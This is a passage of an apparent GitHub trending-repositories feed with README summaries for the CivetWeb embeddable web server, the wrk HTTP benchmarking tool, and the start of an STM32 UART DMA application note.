src=&#34;https://api.travis-ci.com/civetweb/civetweb.svg?branch=master&#34; alt=&#34;Travis Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Continuous integration for Windows (&lt;a href=&#34;https://ci.appveyor.com/project/civetweb/civetweb&#34;&gt;AppVeyor&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://ci.appveyor.com/project/civetweb/civetweb/branch/master&#34;&gt;&lt;img src=&#34;https://ci.appveyor.com/api/projects/status/github/civetweb/civetweb?svg=true&#34; alt=&#34;Appveyor Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Test coverage check (&lt;a href=&#34;https://coveralls.io/github/civetweb/civetweb&#34;&gt;coveralls&lt;/a&gt;, &lt;a href=&#34;https://codecov.io/gh/civetweb/civetweb/branch/master&#34;&gt;codecov&lt;/a&gt;) (using different tools/settings):&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;&#34;&gt;&lt;img src=&#34;https://img.shields.io/coveralls/civetweb/civetweb.svg?maxAge=3600&#34; alt=&#34;Coveralls&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://coveralls.io/github/civetweb/civetweb?branch=master&#34;&gt;&lt;img src=&#34;https://coveralls.io/repos/github/civetweb/civetweb/badge.svg?branch=master&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/civetweb/civetweb&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/civetweb/civetweb/branch/master/graph/badge.svg?sanitize=true&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Static source code analysis (&lt;a href=&#34;https://scan.coverity.com/projects/5784&#34;&gt;Coverity&lt;/a&gt;): &lt;a href=&#34;https://scan.coverity.com/projects/5784&#34;&gt;&lt;img src=&#34;https://scan.coverity.com/projects/5784/badge.svg?sanitize=true&#34; alt=&#34;Coverity Scan Build Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;CodeQL semantic code analysis: &lt;a href=&#34;https://github.com/civetweb/civetweb/actions/workflows/codeql-analysis.yml&#34;&gt;&lt;img src=&#34;https://github.com/civetweb/civetweb/workflows/CodeQL/badge.svg?sanitize=true&#34; alt=&#34;CodeQL&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Project Mission&lt;/h2&gt; &#xA;&lt;p&gt;Project mission is to provide easy to use, powerful, C (C/C++) embeddable web server with optional CGI, SSL and Lua support. CivetWeb has a MIT license so you can innovate without restrictions.&lt;/p&gt; &#xA;&lt;p&gt;CivetWeb can be used by developers as a library, to add web server functionality to an existing application.&lt;/p&gt; &#xA;&lt;p&gt;It can also be used by end users as a stand-alone web server running on a Windows or Linux PC. It is available as single executable, no installation is required.&lt;/p&gt; &#xA;&lt;h2&gt;Where to find the official version?&lt;/h2&gt; &#xA;&lt;p&gt;End users can download CivetWeb binaries / releases from here on GitHub &lt;a href=&#34;https://github.com/civetweb/civetweb/releases&#34;&gt;https://github.com/civetweb/civetweb/releases&lt;/a&gt; or SourceForge &lt;a href=&#34;https://sourceforge.net/projects/civetweb/&#34;&gt;https://sourceforge.net/projects/civetweb/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Developers can contribute to CivetWeb via GitHub &lt;a href=&#34;https://github.com/civetweb/civetweb&#34;&gt;https://github.com/civetweb/civetweb&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Due to a &lt;a href=&#34;https://github.com/git-for-windows/git/issues/2435&#34;&gt;bug in Git for Windows V2.24&lt;/a&gt; CivetWeb must be used with an earlier or later version (see also &lt;a href=&#34;https://github.com/civetweb/civetweb/issues/812&#34;&gt;here&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Bugs and requests should be filed on GitHub &lt;a href=&#34;https://github.com/civetweb/civetweb/issues&#34;&gt;https://github.com/civetweb/civetweb/issues&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;New releases are announced on Google Groups &lt;a href=&#34;https://groups.google.com/d/forum/civetweb&#34;&gt;https://groups.google.com/d/forum/civetweb&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Formerly some support question and discussion threads have been at &lt;a href=&#34;https://groups.google.com/d/forum/civetweb&#34;&gt;Google groups&lt;/a&gt;. Recent questions and discussions use &lt;a href=&#34;https://github.com/civetweb/civetweb/issues&#34;&gt;GitHub issues&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Source releases can be found on GitHub &lt;a href=&#34;https://github.com/civetweb/civetweb/releases&#34;&gt;https://github.com/civetweb/civetweb/releases&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A very brief overview can be found on GitHub Pages &lt;a href=&#34;https://civetweb.github.io/civetweb/&#34;&gt;https://civetweb.github.io/civetweb/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quick start documentation&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/Installing.md&#34;&gt;docs/Installing.md&lt;/a&gt; - Install Guide (for end users using pre-built binaries)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/UserManual.md&#34;&gt;docs/UserManual.md&lt;/a&gt; - End User Guide&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/Building.md&#34;&gt;docs/Building.md&lt;/a&gt; - Building the Server (quick start guide)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/Embedding.md&#34;&gt;docs/Embedding.md&lt;/a&gt; - Embedding (how to add HTTP support to an existing application)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/OpenSSL.md&#34;&gt;docs/OpenSSL.md&lt;/a&gt; - Adding HTTPS (SSL/TLS) support using OpenSSL.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/tree/master/docs/api&#34;&gt;API documentation&lt;/a&gt; - Additional documentation on the civetweb application programming interface (&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/include/civetweb.h&#34;&gt;civetweb.h&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/RELEASE_NOTES.md&#34;&gt;RELEASE_NOTES.md&lt;/a&gt; - Release Notes&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/SECURITY.md&#34;&gt;SECURITY.md&lt;/a&gt; - Security Policy&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/LICENSE.md&#34;&gt;LICENSE.md&lt;/a&gt; - Copyright License&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;CivetWeb keeps the balance between functionality and simplicity by a carefully selected list of features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Forked from &lt;a href=&#34;https://code.google.com/p/mongoose/&#34;&gt;Mongoose&lt;/a&gt; in 2013, before it changed the licence from MIT to commercial + GPL. A lot of enhancements have been added since then, see &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/RELEASE_NOTES.md&#34;&gt;RELEASE_NOTES.md&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Maintains the liberal, permissive, commercial-friendly, &lt;a href=&#34;https://en.wikipedia.org/wiki/MIT_License&#34;&gt;MIT license&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Project is free from copy-left licenses, like GPL, because you should innovate without restrictions.&lt;/li&gt; &#xA; &lt;li&gt;Works on Windows, Mac, Linux, UNIX, IOS, Android, Buildroot, and many other platforms.&lt;/li&gt; &#xA; &lt;li&gt;Scripting and database support (CGI, Lua Server Pages, Server side Lua scripts, Lua SQLite database, Server side JavaScript). This provides a ready to go, powerful web development platform in a one single-click executable with &lt;strong&gt;no dependencies&lt;/strong&gt;. 0&lt;/li&gt; &#xA; &lt;li&gt;Support for CGI, SSI, HTTP digest (MD5) authorization, WebSocket, WebDAV.&lt;/li&gt; &#xA; &lt;li&gt;Experimental HTTP/2 support.&lt;/li&gt; &#xA; &lt;li&gt;HTTPS (SSL/TLS) support using &lt;a href=&#34;https://www.openssl.org/&#34;&gt;OpenSSL&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Optional support for authentication using client side X.509 certificates.&lt;/li&gt; &#xA; &lt;li&gt;Resumed download, URL rewrite, file blacklist, IP-based ACL.&lt;/li&gt; &#xA; &lt;li&gt;Can run as a Windows service or systemd service.&lt;/li&gt; &#xA; &lt;li&gt;Download speed limit based on client subnet or URI pattern.&lt;/li&gt; &#xA; &lt;li&gt;Simple and clean embedding API.&lt;/li&gt; &#xA; &lt;li&gt;The source is in single file for drop in compilation.&lt;/li&gt; &#xA; &lt;li&gt;Embedding examples included.&lt;/li&gt; &#xA; &lt;li&gt;HTTP client capable of sending arbitrary HTTP/HTTPS requests.&lt;/li&gt; &#xA; &lt;li&gt;Websocket client functionality available (WS/WSS).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Optionally included software&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://lua.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/lua-logo.jpg&#34; alt=&#34;Lua&#34; title=&#34;Lua Logo&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://keplerproject.github.io/luafilesystem/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/luafilesystem-logo.jpg&#34; alt=&#34;LuaFileSystem&#34; title=&#34;LuaFileSystem Logo&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://lua.sqlite.org/index.cgi/index&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/luasqlite-logo.jpg&#34; alt=&#34;LuaSQLite3&#34; title=&#34;LuaSQLite3 Logo&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sqlite.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/sqlite3-logo.jpg&#34; alt=&#34;Sqlite3&#34; title=&#34;Sqlite3 Logo&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/n1tehawk/LuaXML&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/luaxml-logo.jpg&#34; alt=&#34;LuaXML&#34; title=&#34;LuaXML Logo&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://duktape.org&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/civetweb/civetweb/master/resources/duktape-logo.png&#34; alt=&#34;Duktape&#34; title=&#34;Duktape Logo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Optional dependencies&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://zlib.net&#34;&gt;zlib&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.openssl.org/&#34;&gt;OpenSSL&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/ARMmbed/mbedtls&#34;&gt;Mbed TLS&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;This project is very easy to install and use. Please read the &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/&#34;&gt;documentation&lt;/a&gt; and have a look at the &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/examples/&#34;&gt;examples&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Recent questions and discussions usually use &lt;a href=&#34;https://github.com/civetweb/civetweb/issues&#34;&gt;GitHub issues&lt;/a&gt;. Some old information may be found on the &lt;a href=&#34;https://groups.google.com/d/forum/civetweb&#34;&gt;mailing list&lt;/a&gt;, but this information may be outdated.&lt;/p&gt; &#xA;&lt;p&gt;Feel free to create a GitHub issue for bugs, feature requests, questions, suggestions or if you want to share tips and tricks. When creating an issues for a bug, add enough description to reproduce the issue - at least add CivetWeb version and operating system. Please see also the guidelines for &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/Contribution.md&#34;&gt;Contributions&lt;/a&gt; and the &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/SECURITY.md&#34;&gt;Security Policy&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Note: We do not take any liability or warranty for any linked contents. Visit these pages and try the community support suggestions at your own risk. Any link provided in this project (including source and documentation) is provided in the hope that this information will be helpful. However, we cannot accept any responsibility for any content on an external page.&lt;/p&gt; &#xA;&lt;h2&gt;Contributions&lt;/h2&gt; &#xA;&lt;p&gt;Contributions are welcome provided all contributions carry the MIT license.&lt;/p&gt; &#xA;&lt;p&gt;DO NOT APPLY fixes copied from Mongoose to this project to prevent GPL tainting. Since 2013, CivetWeb and Mongoose have been developed independently. By now the code base differs, so patches cannot be safely transferred in either direction.&lt;/p&gt; &#xA;&lt;p&gt;Some guidelines can be found in &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/docs/Contribution.md&#34;&gt;docs/Contribution.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Authors&lt;/h2&gt; &#xA;&lt;p&gt;CivetWeb was forked from the last MIT version of Mongoose in August 2013. Since then, CivetWeb has seen many improvements from various authors (Copyright (c) 2013-2021 the CivetWeb developers, MIT license).&lt;/p&gt; &#xA;&lt;p&gt;A list of authors can be found in &lt;a href=&#34;https://github.com/civetweb/civetweb/raw/master/CREDITS.md&#34;&gt;CREDITS.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;CivetWeb is based on the &lt;a href=&#34;https://github.com/cesanta/mongoose&#34;&gt;Mongoose project&lt;/a&gt;. The original author of Mongoose was Sergey Lyubka(2004-2013) who released it under the MIT license. However, on August 16, 2013, &lt;a href=&#34;https://groups.google.com/forum/#!topic/mongoose-users/aafbOnHonkI&#34;&gt;Mongoose was relicensed to a dual GPL V2 + commercial license&lt;/a&gt; and CiwetWeb was created by Thomas Davis (sunsetbrew) as &#34;the MIT fork of mongoose&#34;. The license change and CivetWeb fork was mentioned on the Mongoose &lt;a href=&#34;https://en.wikipedia.org/wiki/Mongoose_(web_server)&#34;&gt;Wikipedia&lt;/a&gt; page as well, but it&#39;s getting deleted (and added again) there every now and then.&lt;/p&gt; &#xA;&lt;p&gt;Using the CivetWeb project ensures the MIT licenses terms are applied and GPL cannot be imposed on any of this code, as long as it is sourced from here. This code will remain free with the MIT license protection.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wg/wrk</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/wg/wrk</id>
    <link href="https://github.com/wg/wrk" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Modern HTTP benchmarking tool&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;wrk - a HTTP benchmarking tool&lt;/h1&gt; &#xA;&lt;p&gt;wrk is a modern HTTP benchmarking tool capable of generating significant load when run on a single multi-core CPU. It combines a multithreaded design with scalable event notification systems such as epoll and kqueue.&lt;/p&gt; &#xA;&lt;p&gt;An optional LuaJIT script can perform HTTP request generation, response processing, and custom reporting. Details are available in SCRIPTING and several examples are located in &lt;a href=&#34;https://raw.githubusercontent.com/wg/wrk/master/scripts/&#34;&gt;scripts/&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Basic Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;wrk -t12 -c400 -d30s http://127.0.0.1:8080/index.html&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This runs a benchmark for 30 seconds, using 12 threads, and keeping 400 HTTP connections open.&lt;/p&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Running 30s test @ http://127.0.0.1:8080/index.html&#xA;  12 threads and 400 connections&#xA;  Thread Stats   Avg      Stdev     Max   +/- Stdev&#xA;    Latency   635.91us    0.89ms  12.92ms   93.69%&#xA;    Req/Sec    56.20k     8.07k   62.00k    86.54%&#xA;  22464657 requests in 30.00s, 17.76GB read&#xA;Requests/sec: 748868.53&#xA;Transfer/sec:    606.33MB&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Command Line Options&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;-c, --connections: total number of HTTP connections to keep open with&#xA;                   each thread handling N = connections/threads&#xA;&#xA;-d, --duration:    duration of the test, e.g. 2s, 2m, 2h&#xA;&#xA;-t, --threads:     total number of threads to use&#xA;&#xA;-s, --script:      LuaJIT script, see SCRIPTING&#xA;&#xA;-H, --header:      HTTP header to add to request, e.g. &#34;User-Agent: wrk&#34;&#xA;&#xA;    --latency:     print detailed latency statistics&#xA;&#xA;    --timeout:     record a timeout if a response is not received within&#xA;                   this amount of time.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Benchmarking Tips&lt;/h2&gt; &#xA;&lt;p&gt;The machine running wrk must have a sufficient number of ephemeral ports available and closed sockets should be recycled quickly. To handle the initial connection burst the server&#39;s listen(2) backlog should be greater than the number of concurrent connections being tested.&lt;/p&gt; &#xA;&lt;p&gt;A user script that only changes the HTTP method, path, adds headers or a body, will have no performance impact. Per-request actions, particularly building a new HTTP request, and use of response() will necessarily reduce the amount of load that can be generated.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;wrk contains code from a number of open source projects including the &#39;ae&#39; event loop from redis, the nginx/joyent/node.js &#39;http-parser&#39;, and Mike Pall&#39;s LuaJIT. Please consult the NOTICE file for licensing details.&lt;/p&gt; &#xA;&lt;h2&gt;Cryptography Notice&lt;/h2&gt; &#xA;&lt;p&gt;This distribution includes cryptographic software. The country in which you currently reside may have restrictions on the import, possession, use, and/or re-export to another country, of encryption software. BEFORE using any encryption software, please check your country&#39;s laws, regulations and policies concerning the import, possession, or use, and re-export of encryption software, to see if this is permitted. See &lt;a href=&#34;http://www.wassenaar.org/&#34;&gt;http://www.wassenaar.org/&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;p&gt;The U.S. Government Department of Commerce, Bureau of Industry and Security (BIS), has classified this software as Export Commodity Control Number (ECCN) 5D002.C.1, which includes information security software using or performing cryptographic functions with symmetric algorithms. The form and manner of this distribution makes it eligible for export under the License Exception ENC Technology Software Unrestricted (TSU) exception (see the BIS Export Administration Regulations, Section 740.13) for both object code and source code.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>MaJerle/stm32-usart-uart-dma-rx-tx</title>
    <updated>2022-06-03T01:34:42Z</updated>
    <id>tag:github.com,2022-06-03:/MaJerle/stm32-usart-uart-dma-rx-tx</id>
    <link href="https://github.com/MaJerle/stm32-usart-uart-dma-rx-tx" rel="alternate"></link>
    <summary type="html">&lt;p&gt;STM32 examples for USART using DMA for efficient RX and TX transmission&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;STM32 UART DMA RX and TX&lt;/h1&gt; &#xA;&lt;p&gt;This application note contains explanation with examples for &lt;code&gt;2&lt;/code&gt; distinct topics:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Data reception with UART and DMA when application does not know size of bytes to receive in advance&lt;/li&gt; &#xA; &lt;li&gt;Data transmission with UART and DMA to avoid CPU stalling and use CPU for other purposes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;p&gt;Github supports ToC by default. It is available in the top-left corner of this document.&lt;/p&gt; &#xA;&lt;h2&gt;Abbreviations&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;DMA: Direct Memory Access controller in STM32&lt;/li&gt; &#xA; &lt;li&gt;UART: Universal Asynchronous Receiver Transmitter&lt;/li&gt; &#xA; &lt;li&gt;USART: Universal Synchronous Asynchronous Receiver Transmitter&lt;/li&gt; &#xA; &lt;li&gt;TX: Transmit&lt;/li&gt; &#xA; &lt;li&gt;RX: Receive&lt;/li&gt; &#xA; &lt;li&gt;HT: Half-Transfer Complete DMA event/flag&lt;/li&gt; &#xA; &lt;li&gt;TC: Transfer Complete DMA event/flag&lt;/li&gt; &#xA; &lt;li&gt;RTO: Receiver Timeout UART event/flag&lt;/li&gt; &#xA; &lt;li&gt;IRQ: Interrupt&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;General about UART&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;STM32 has peripherals such as USART, UART or LPUART. Difference between them is not relevant for this purpose since concept can be applied to all of them. In few words, USART supports synchronous operation on top of asynchronous (UART) and LPUART supports Low-Power operation in STOP mode. When synchronous mode or low-power mode is not used, USART, UART and LPUART can be consideted identical. For complete set of details, check product&#39;s reference manual and datasheet.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;For the sake of this application note, we will only use term &lt;strong&gt;UART&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;UART in STM32 allows configurion using different transmit (&lt;code&gt;TX&lt;/code&gt;) and receive (&lt;code&gt;RX&lt;/code&gt;) modes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Polling mode (no DMA, no IRQ) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;P: Application is polling for status bits to check if any character has been transmitted/received and read it fast enough in order to not-miss any byte&lt;/li&gt; &#xA;   &lt;li&gt;P: Easy to implement, simply few code lines&lt;/li&gt; &#xA;   &lt;li&gt;C: Can easiy miss received data in complex application if CPU cannot read registers quickly enough&lt;/li&gt; &#xA;   &lt;li&gt;C: Works only for low baudrates, &lt;code&gt;9600&lt;/code&gt; or lower&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Interrupt mode (no DMA) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;P: UART triggers interrupt and CPU jumps to service routine to handle each received byte separately&lt;/li&gt; &#xA;   &lt;li&gt;P: Commonly used approach in embedded applications&lt;/li&gt; &#xA;   &lt;li&gt;P: Works well with common baudrates, &lt;code&gt;115200&lt;/code&gt;, up to &lt;code&gt;~921600&lt;/code&gt; bauds&lt;/li&gt; &#xA;   &lt;li&gt;C: Interrupt service routine is executed for every received character&lt;/li&gt; &#xA;   &lt;li&gt;C: May decrease system performance if interrupts are triggered for every character for high-speed baudrates&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;DMA mode &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;DMA is used to transfer data from USART RX data register to user memory on hardware level. No application interaction is needed at this point except processing received data by application once necessary&lt;/li&gt; &#xA;   &lt;li&gt;P: Transfer from USART peripheral to memory is done on hardware level without CPU interaction&lt;/li&gt; &#xA;   &lt;li&gt;P: Can work very easily with operating systems&lt;/li&gt; &#xA;   &lt;li&gt;P: Optimized for highest baudrates &lt;code&gt;&amp;gt; 1Mbps&lt;/code&gt; and low-power applications&lt;/li&gt; &#xA;   &lt;li&gt;P: In case of big bursts of data, increasing data buffer size can improve functionality&lt;/li&gt; &#xA;   &lt;li&gt;C: Number of bytes to transfer must be known in advance by DMA hardware&lt;/li&gt; &#xA;   &lt;li&gt;C: If communication fails, DMA may not notify application about all bytes transferred&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;This article focuses only on &lt;em&gt;DMA mode&lt;/em&gt; for RX operation and explain how to handle unknown data length&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Every STM32 has at least one (&lt;code&gt;1&lt;/code&gt;) UART IP and at least one (&lt;code&gt;1&lt;/code&gt;) DMA controller available in its DNA. This is all we need for successful data transmission. Application uses default features to implement very efficient transmit system using DMA.&lt;/p&gt; &#xA;&lt;p&gt;While implementation happens to be pretty straight-forward for TX (set pointer to data, define its length and go) operation, this may not be the case for receive. Implementing DMA receive, application should understand number of received bytes to process by DMA before its considered &lt;em&gt;done&lt;/em&gt;. However, UART protocol does not offer such information (it could work with higher-level protocol, but that&#39;s way another story that we don&#39;t touch here. We assume we have to implement very reliable low-level communication protocol).&lt;/p&gt; &#xA;&lt;h2&gt;Idle Line or Receiver Timeout events&lt;/h2&gt; &#xA;&lt;p&gt;STM32s have capability in UART to detect when &lt;em&gt;RX&lt;/em&gt; line has not been active for period of time. This is achieved using &lt;code&gt;2&lt;/code&gt; methods:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;IDLE LINE event&lt;/em&gt;: Triggered when RX line has been in idle state (normally high state) for &lt;code&gt;1&lt;/code&gt; frame time, after last received byte. Frame time is based on baudrate. Higher baudrate means lower frame time for single byte.&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;RTO (Receiver Timeout) event&lt;/em&gt;: Triggered when line has been in idle state for programmable time. It is fully configured by firmware.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Both events can trigger an interrupt which is an essential feature to allow effective receive operation&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Not all STM32 have &lt;em&gt;IDLE LINE&lt;/em&gt; or &lt;em&gt;RTO&lt;/em&gt; features available. When not available, examples concerning these features may not be used.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;An example: To transmit &lt;code&gt;1&lt;/code&gt; byte at &lt;code&gt;115200&lt;/code&gt; bauds, it takes approximately (for easier estimation) &lt;code&gt;~100us&lt;/code&gt;; for &lt;code&gt;3 bytes&lt;/code&gt; it would be &lt;code&gt;~300us&lt;/code&gt; in total. IDLE line event triggers an interrupt when line has been in idle state for &lt;code&gt;1&lt;/code&gt; frame time (in this case &lt;code&gt;100us&lt;/code&gt;), after third byte has been received.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/MaJerle/stm32-usart-uart-dma-rx-tx/main/docs/idle_line_demo.png&#34; alt=&#34;IDLE LINE DEMO&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This is a real experiment demo using &lt;em&gt;STM32F4&lt;/em&gt; and &lt;em&gt;IDLE LINE&lt;/em&gt; event. After &lt;em&gt;IDLE event&lt;/em&gt; is triggered, data are echoed back (loopback mode):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Application receives &lt;code&gt;3&lt;/code&gt; bytes, takes approx &lt;code&gt;~300us&lt;/code&gt; at &lt;code&gt;115200&lt;/code&gt; bauds&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;RX&lt;/em&gt; goes to high state (yellow rectangle) and &lt;em&gt;UART RX&lt;/em&gt; detects it has been idle for at least &lt;code&gt;1&lt;/code&gt; frame time (approx &lt;code&gt;100us&lt;/code&gt;) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Width of yellow rectangle represents &lt;code&gt;1&lt;/code&gt; frame time&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;IDLE line&lt;/em&gt; interrupt is triggered at green arrow&lt;/li&gt; &#xA; &lt;li&gt;Application echoes data back from interrupt context&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;General about DMA&lt;/h2&gt; &#xA;&lt;p&gt;DMA in STM32 can be configured in &lt;code&gt;normal&lt;/code&gt; or &lt;code&gt;circular&lt;/code&gt; mode. For each mode, &lt;em&gt;DMA&lt;/em&gt; requires number of &lt;em&gt;elements&lt;/em&gt; to transfer before its events (half-transfer complete, transfer complete) are triggered.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;Normal mode&lt;/em&gt;: DMA starts with data transfer, once it transfers all elements, it stops and sets enable bit to &lt;code&gt;0&lt;/code&gt;. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Application is using this mode when transmitting data&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;Circular mode&lt;/em&gt;: DMA starts with transfer, once it transfers all elements (as written in corresponding length register), it starts from beginning of memory and transfers more &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Applicaton is using this mode when receiving data&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;While transfer is active, &lt;code&gt;2&lt;/code&gt; (among others) interrupts may be triggered:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;em&gt;Half-Transfer complete &lt;code&gt;HT&lt;/code&gt;&lt;/em&gt;: Triggers when DMA transfers half count of elements&lt;/li&gt; &#xA; &lt;li&gt;&lt;em&gt;Transfer-Complete &lt;code&gt;TC&lt;/code&gt;&lt;/em&gt;: Triggers when DMA transfers all elements&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;When DMA operates in 